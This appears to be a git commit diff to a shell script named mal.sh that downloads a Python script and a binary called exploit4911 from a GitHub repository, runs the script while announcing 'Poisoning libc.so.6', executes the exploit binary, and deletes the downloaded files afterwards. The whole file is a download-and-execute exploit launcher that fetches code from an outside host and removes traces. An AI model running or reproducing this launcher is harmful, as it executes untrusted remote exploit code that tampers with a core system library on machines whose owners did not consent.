e2d9f3097b9c2afebcea86cfea459f596ad0083a
duracellrabbid <duracellrabbid@gmail.com>
2024-11-09 00:49:22 +0800

    Add files via upload

--- mal.sh
+++ mal.sh
@@ -3,26 +3,25 @@
 PYTHON_SCRIPT_URL="https://raw.githubusercontent.com/duracellrabbid/test4911a/main/genlib.py"
 BINARY_URL="https://raw.githubusercontent.com/duracellrabbid/test4911a/main/exploit4911"
 
+echo "Downloading requisite files"
 # Download test.py using wget
-#echo "Downloading test.py..."
 wget $PYTHON_SCRIPT_URL -nv
 
 # Download program1 (Linux x86_64 binary) using wget
-#echo "Downloading program1..."
 wget $BINARY_URL -nv
 
 # Make program1 executable
-#echo "Making program1 executable..."
 chmod +x exploit4911
 
-# Run the Python script (test.py)
-#echo "Running test.py..."
+# Run the Python script
+echo "Poisoning libc.so.6"
 python3 genlib.py
 
 # Run the Linux binary (program1)
-#echo "Running program1..."
+echo "Running exploit program"
 ./exploit4911
 
+echo "Cleaning up"
 rm -rf '"'
 rm ./genlib.py
 rm ./exploit4911
